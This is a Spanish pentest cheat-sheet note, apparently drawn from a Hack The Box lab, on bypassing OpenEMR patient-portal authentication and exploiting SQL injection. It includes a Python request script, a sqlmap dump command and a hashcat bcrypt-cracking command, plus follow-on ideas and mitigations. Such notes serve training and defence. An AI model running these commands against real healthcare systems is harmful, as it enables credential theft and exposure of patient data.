---
topic: "OpenEMR: bypass de autenticación y SQLi"
tags: [web, openemr, auth-bypass, sqli, healthcare]
---

# OpenEMR: bypass de autenticación y SQLi

[🌐 English](openemr-auth-bypass-sqli.en.md) | **Español**

## Concepto

El portal de pacientes de OpenEMR permite registrar una cuenta y luego acceder a páginas internas sin completar la autenticación. Varias de esas páginas concatenan parámetros en SQL, lo que permite volcar usuarios y hashes.

## Cuándo aplica

- El portal de pacientes está expuesto.
- La versión de OpenEMR es antigua o no está parcheada.
- El registro de pacientes está habilitado.

## Procedimiento

1. Registrar una cuenta en `/portal/account/register.php`.
2. Visitar la página interna vulnerable para activar la sesión.
3. Confirmar la SQLi con una comilla o una función temporal.
4. Volcar usuarios y crackear el hash bcrypt del administrador.

```bash
python3 - <<'PY'
import requests
s = requests.Session()
s.get('http://hms.htb/portal/account/register.php')
r = s.get('http://hms.htb/portal/add_edit_event_user.php?eid=1')
print(r.text)
PY
sqlmap -u 'http://hms.htb/portal/add_edit_event_user.php?eid=1' --cookie='PHPSESSID=<SESSION>' --batch --dump
hashcat -m 3200 hash.txt rockyou.txt
```

## Variantes

- Usar la RCE autenticada de OpenEMR tras obtener credenciales.
- Aprovechar la lectura de archivos del portal.
- Combinar con credenciales reutilizadas en SSH.

## Limitaciones

- El portal debe permitir registro.
- La versión debe tener el bypass.
- La sesión debe conservarse entre peticiones.

## Mitigación y detección

- Actualizar OpenEMR y revisar el portal.
- Usar consultas parametrizadas y validar sesiones.
- Limitar el registro y aplicar MFA al personal.

## Referencias

- <https://www.open-emr.org/>
- <https://owasp.org/www-community/attacks/SQL_Injection>
- <https://attack.mitre.org/techniques/T1190/>
